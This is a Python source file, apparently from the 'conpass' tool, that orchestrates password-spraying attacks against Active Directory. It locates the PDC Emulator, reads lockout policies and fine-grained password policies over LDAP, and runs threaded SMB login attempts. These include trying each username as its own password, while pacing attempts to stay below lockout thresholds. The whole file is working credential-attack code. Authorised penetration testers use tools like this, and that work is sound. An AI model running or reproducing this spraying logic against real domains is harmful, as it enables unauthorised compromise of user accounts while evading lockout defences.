"""Password spray orchestrator - coordinates the spray operation."""

import signal
import threading
import time

from rich.console import Console
from rich.progress import (
    BarColumn,
    MofNCompleteColumn,
    Progress,
    TaskProgressColumn,
    TextColumn,
)
from rich.prompt import Confirm
from rich.table import Table

from conpass.config import SprayConfig
from conpass.core.scheduler import Scheduler
from conpass.core.worker import Worker, WorkerContext
from conpass.exceptions import PdcNotFoundError
from conpass.models import Credentials, PasswordPolicy, User
from conpass.services.database import DatabaseService
from conpass.services.ldap import LdapService
from conpass.services.policy import PolicyService
from conpass.services.smb import SmbService
from conpass.utils import find_pdc_hostname, resolve_hostname


class SprayOrchestrator:
    """Main orchestrator for password spraying operations."""

    def __init__(
        self,
        config: SprayConfig,
        credentials: Credentials | None,
        console: Console
    ):
        self.config = config
        self.credentials = credentials
        self.console = console

        # Services
        self.ldap_service: LdapService | None = None
        self.policy_service: PolicyService | None = None
        self.database_service: DatabaseService | None = None
        self.time_delta = None
        self.dc_host = None
        self.dc_ip = None
        self.pdc_ip = None

        # Spray state
        self.users: list[User] = []
        self.default_policy: PasswordPolicy | None = None
        self.psos: list[PasswordPolicy] = []

        # Threading
        self.scheduler: Scheduler | None = None
        self.workers: list[Worker] = []
        self.stop_event = threading.Event()
        self.lockout_event = threading.Event()
        self.connected_workers = 0
        self.failed_workers = 0
        self.connected_workers_lock = threading.Lock()

        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def run(self) -> None:
        """Main entry point for spray operation."""
        self._display_warning()
        self._gather_information()

        if self.config.disable_spray:
            self.console.print(
                "[yellow]Password spraying skipped: no password file provided or explicitly disabled.[/yellow]"
            )
            return

        self._start_spray()

    def _display_warning(self) -> None:
        """Display important warnings."""
        self.console.rule('Important information')
        self.console.print(
            "[yellow]This tool does its best to find the effective password policy "
            "but may be wrong. Use with caution.[/yellow]"
        )
        self.console.print(
            "[yellow]Emergency command:[/yellow] "
            "[red]Search-ADAccount -LockedOut | Unlock-ADAccount[/red]"
        )

    def _gather_information(self) -> None:
        """Gather domain information and build user list."""
        self.console.rule('Gathering info')

        # Get DC details
        if not self.config.dc_ip:
            self._debug(f"Resolving DC details for domain: {self.config.domain}")
            self.dc_host, self.dc_ip = SmbService.get_dc_details(self.config.domain, self.config.dns_ip)
        else:
            self.dc_ip = self.config.dc_ip
            self.dc_host = self.config.dc_host or self.dc_ip
        self._debug(f"Using DC: {self.dc_host} ({self.dc_ip})")

        # Initialize database service if configured
        if self.config.use_database:
            self._debug(f"Initializing database: {self.config.database_path}")
            self.database_service = DatabaseService(self.config.database_path, self.config.domain)
            self.database_service.connect()

            stats = self.database_service.get_stats()
            self.console.print(
                f"[cyan]Database statistics: {stats['total']} tests recorded "
                f"({stats['successful']} successful, {stats['failed']} failed)[/cyan]"
            )

        if self.config.is_online_mode:
            self._gather_online_mode()
        else:
            self._gather_offline_mode()

        self._exclude_already_found()
        self.console.print(f"[bold green]Total sprayed users: {len(self.users)}[/bold green]")

    def _debug(self, message: str) -> None:
        if self.config.debug:
            self.console.print(f"[cyan][DEBUG] {message}[/cyan]")

    def _measure_time_delta(self) -> None:
        """badPasswordTime and lockoutTime are written with the PDC clock: sync on it."""
        self.time_delta = SmbService.get_time_delta(self.pdc_ip)
        self.console.print(
            f"Time difference with PDC ({self.pdc_ip}): {self.time_delta.total_seconds()} seconds"
        )

    def _locate_pdc(self) -> None:
        """
        Find the PDC Emulator: badPwdCount is not replicated and only the PDC sees
        every failure and decides the lockout. Authenticating directly against it
        means our attempts only move the counter we read.
        """
        if self.ldap_service:
            pdc_fqdn, pdc_ip = self.ldap_service.find_pdc_emulator()
        else:
            pdc_fqdn = find_pdc_hostname(self.config.domain, self.config.dns_ip or self.dc_ip)
            pdc_ip = None
            if pdc_fqdn:
                try:
                    pdc_ip = resolve_hostname(pdc_fqdn, self.config.dns_ip or self.dc_ip)
                except OSError:
                    pdc_ip = None

        if pdc_ip:
            self.pdc_ip = pdc_ip
            self.console.print(f"[green]PDC Emulator identified: {pdc_fqdn} ({pdc_ip})[/green]")
            return

        self.pdc_ip = self.dc_ip
        self.console.print(
            f"[yellow]Warning: could not identify the PDC Emulator, falling back to {self.dc_ip}. "
            f"If it is not the PDC, attempts may be counted on DCs whose badPwdCount is never read, "
            f"increasing the risk of account lockout.[/yellow]"
        )
        if not Confirm.ask(
            "[yellow]Continue anyway despite the higher lockout risk?[/yellow]",
            console=self.console,
            default=False,
        ):
            raise PdcNotFoundError("Aborted: PDC Emulator could not be identified.")

    def _new_ldap_service(self, dc_ip: str, console: Console | None, fetch_schema: bool) -> LdapService:
        return LdapService(
            credentials=self.credentials,
            base_dn=self.config.base_dn,
            dc_ip=dc_ip,
            use_ssl=self.config.use_ssl,
            page_size=self.config.ldap_page_size,
            timeout=self.config.timeout,
            dns_ip=self.config.dns_ip,
            console=console,
            debug=self.config.debug and console is not None,
            fetch_schema=fetch_schema,
        )

    def _gather_online_mode(self) -> None:
        """Gather information in online mode (with LDAP access)."""
        self.ldap_service = self._new_ldap_service(self.dc_ip, self.console, fetch_schema=True)
        self.ldap_service.connect()
        self._locate_pdc()
        if self.pdc_ip != self.dc_ip:
            self.ldap_service.close()
            self.ldap_service = self._new_ldap_service(self.pdc_ip, self.console, fetch_schema=True)
            self.ldap_service.connect()
        self.console.print(f"Successfully connected to the PDC Emulator ({self.pdc_ip}) via LDAP")
        self._measure_time_delta()

        self.policy_service = PolicyService(
            ldap_service=self.ldap_service,
            security_threshold=self.config.security_threshold,
            time_delta=self.time_delta,
            console=self.console
        )
        self.policy_service.load_policies()
        self.default_policy = self.policy_service.get_default_policy()
        self.psos = self.policy_service.get_psos()

        user_filter = self._read_user_file() if self.config.user_file else None
        self.users = self.policy_service.build_user_list(user_filter)
        self._display_policies()

    def _gather_offline_mode(self) -> None:
        """Gather information in offline mode (no LDAP access)."""
        self.console.print(
            "[yellow]Building users list based on provided password policy. "
            "No online checks will be made.[/yellow]"
        )
        self._locate_pdc()
        self._measure_time_delta()

        self.default_policy = PasswordPolicy(
            name="Manual Domain Policy",
            lockout_threshold=self.config.manual_lockout_threshold,
            lockout_window_seconds=self.config.manual_lockout_observation_window
        )

        table = Table()
        table.add_column('Name')
        table.add_column('Lockout Threshold')
        table.add_column('Lockout Window (s)')
        table.add_row(
            self.default_policy.name,
            str(self.default_policy.lockout_threshold),
            str(self.default_policy.lockout_window_seconds),
        )
        self.console.print(table)

        self.users = [
            User(
                samaccountname=username,
                dn=None,
                policy=self.default_policy,
                security_threshold=self.config.security_threshold,
            )
            for username in self._read_user_file()
        ]

    def _exclude_already_found(self) -> None:
        """Don't spray users whose password was found in a previous run."""
        if not self.database_service:
            return
        found = {username.lower() for username, _ in self.database_service.get_successful_credentials()}
        if not found:
            return
        before = len(self.users)
        self.users = [user for user in self.users if user.samaccountname.lower() not in found]
        if before != len(self.users):
            self.console.print(
                f"[green]{before - len(self.users)} user(s) skipped: password already found "
                f"(conpass --show to display them)[/green]"
            )

    def _display_policies(self) -> None:
        """Display password policies in a table."""
        self.console.rule('Password Policies')

        table = Table()
        table.add_column('Name')
        table.add_column('Lockout Threshold')
        table.add_column('Lockout Window (s)')
        table.add_column('Lockout Duration (s)')
        table.add_column('Min Pwd Length')
        table.add_column('Pwd History')
        table.add_column('Max Pwd Age (d)')
        table.add_column('Min Pwd Age (d)')
        table.add_column('Complexity')
        table.add_column('Nb of enabled users')

        # Default policy
        table.add_row(
            "Default Domain Policy",
            str(self.default_policy.lockout_threshold),
            str(self.default_policy.lockout_window_seconds),
            str(self.default_policy.lockout_duration_seconds),
            str(self.default_policy.min_pwd_length),
            str(self.default_policy.pwd_history_length),
            str(self.default_policy.max_pwd_age_days),
            str(self.default_policy.min_pwd_age_days),
            "Yes" if self.default_policy.complexity_enabled else "No",
            str(len([u for u in self.users if u.policy.is_default]))
        )

        # PSOs
        if self.policy_service and self.policy_service.can_read_pso():
            pso_user_counts = self.policy_service.get_pso_user_counts()
            for pso in self.psos:
                user_count = pso_user_counts.get(pso.name, 0)
                table.add_row(
                    pso.name,
                    str(pso.lockout_threshold),
                    str(pso.lockout_window_seconds),
                    str(pso.lockout_duration_seconds),
                    str(pso.min_pwd_length),
                    str(pso.pwd_history_length),
                    str(pso.max_pwd_age_days),
                    str(pso.min_pwd_age_days),
                    "Yes" if pso.complexity_enabled else "No",
                    str(user_count)
                )
        elif self.policy_service:
            # Can't read PSO details, just show names
            pso_user_counts = self.policy_service.get_pso_user_counts()
            for pso_name, count in pso_user_counts.items():
                table.add_row(pso_name, 'N/A', 'N/A', str(count))

        self.console.print(table)

    def _read_user_file(self) -> list[str]:
        """Read usernames from user file."""
        if not self.config.user_file:
            return []

        usernames = []
        with open(self.config.user_file) as f:
            for line in f:
                username = line.strip()
                if username and not username.isspace():
                    usernames.append(username)
        return usernames

    def _start_spray(self) -> None:
        """Start the password spraying operation."""
        self.console.rule('Password Spraying')

        is_tested = None
        if self.database_service:
            db = self.database_service
            is_tested = lambda user, password: db.is_already_tested(user.samaccountname, password)  # noqa: E731
        self.scheduler = Scheduler(self.users, is_tested)

        self._start_workers()
        if not self._wait_for_workers_connection():
            return

        try:
            self._spray_loop()
        finally:
            self.scheduler.close()
            self.stop_event.set()
            for worker in self.workers:
                worker.join(timeout=5)

        if self.lockout_event.is_set():
            self.console.print("[red bold]Spray aborted: an account lockout was detected.[/red bold]")

    def _start_workers(self) -> None:
        """Start worker threads, each with its own LDAP and SMB connection to the PDC."""
        context = WorkerContext(
            console=self.console,
            domain=self.config.domain,
            pdc_ip=self.pdc_ip,
            time_delta=self.time_delta,
            stop_event=self.stop_event,
            lockout_event=self.lockout_event,
            database_service=self.database_service,
            debug=self.config.debug,
        )
        for i in range(self.config.max_threads):
            ldap_service = None
            if self.config.is_online_mode:
                ldap_service = self._new_ldap_service(self.pdc_ip, console=None, fetch_schema=False)
            smb_service = SmbService(
                dc_ip=self.pdc_ip,
                domain=self.config.domain,
                console=self.console,
                timeout=max(self.config.timeout, 10),
            )
            worker = Worker(
                worker_id=i + 1,
                scheduler=self.scheduler,
                ldap_service=ldap_service,
                smb_service=smb_service,
                context=context,
                on_connected=self._on_worker_connected,
            )
            worker.start()
            self.workers.append(worker)

    def _on_worker_connected(self, success: bool) -> None:
        with self.connected_workers_lock:
            if success:
                self.connected_workers += 1
            else:
                self.failed_workers += 1

    def _wait_for_workers_connection(self) -> bool:
        """Wait for all workers to connect with a progress bar. False if none could."""
        from rich.progress import TextColumn

        total_workers = len(self.workers)
        with Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            MofNCompleteColumn(),
            console=self.console,
            transient=True
        ) as progress:
            task = progress.add_task("Connecting workers...", total=total_workers)
            while True:
                with self.connected_workers_lock:
                    connected, failed = self.connected_workers, self.failed_workers
                progress.update(task, completed=connected)
                if connected + failed >= total_workers:
                    break
                time.sleep(0.1)

        if connected == 0:
            self.console.print("[red]No worker could connect, aborting.[/red]")
            return False
        self.console.print(f"[green]✓ {connected}/{total_workers} workers connected")
        return True

    def _spray_loop(self) -> None:
        """Feed the scheduler with passwords (watching the password file) until done."""
        if self.config.user_as_pass:
            for user in self.users:
                self.scheduler.add_user_password(user, user.samaccountname)

        seen_passwords: set[str] = set()
        last_file_check = 0.0
        announced_idle = False

        with Progress(
            "[progress.description]{task.description}",
            BarColumn(),
            MofNCompleteColumn(),
            TaskProgressColumn(),
            TextColumn("[bright_black]{task.fields[waiting]}"),
            console=self.console
        ) as progress:
            task = progress.add_task("Spraying passwords", total=0, waiting="")

            while not self.stop_event.is_set() and not self.lockout_event.is_set():
                if not any(w.is_alive() for w in self.workers):
                    break

                if self.config.password_file and time.monotonic() - last_file_check >= 1.0:
                    last_file_check = time.monotonic()
                    new_passwords = self._read_new_passwords(seen_passwords)
                    if new_passwords:
                        seen_passwords.update(new_passwords)
                        self.scheduler.add_passwords(new_passwords)
                        announced_idle = False
                        self.console.print(f"[cyan]Added {len(new_passwords)} new password(s)[/cyan]")

                completed, total = self.scheduler.progress()
                waiting = self.scheduler.waiting_count()
                progress.update(
                    task, completed=completed, total=total,
                    waiting=f"{waiting} user(s) waiting for their lockout window" if waiting else "",
                )

                if self.scheduler.is_done():
                    if not self.config.password_file:
                        break
                    if not announced_idle:
                        announced_idle = True
                        self.console.print(
                            "[green]All passwords tested. Watching the password file for new ones "
                            "(Ctrl+C to quit)[/green]"
                        )

                time.sleep(0.5)

        self.console.print("[green]Spray completed![/green]")

    def _read_new_passwords(self, seen_passwords: set) -> list[str]:
        """Read password file and return only new passwords not in seen_passwords."""
        new_passwords = []

        try:
            with open(self.config.password_file) as f:
                for line in f:
                    password = line.strip()
                    if password and password not in seen_passwords and password not in new_passwords:
                        new_passwords.append(password)
        except FileNotFoundError:
            # File might have been deleted, ignore
            pass
        except Exception:
            # Other errors, ignore and continue
            pass

        return new_passwords

    def _signal_handler(self, signum, frame) -> None:
        """Handle interrupt signals."""
        self.console.print("[red]** Interrupted! **[/red]")
        self.stop_event.set()
        exit(0)
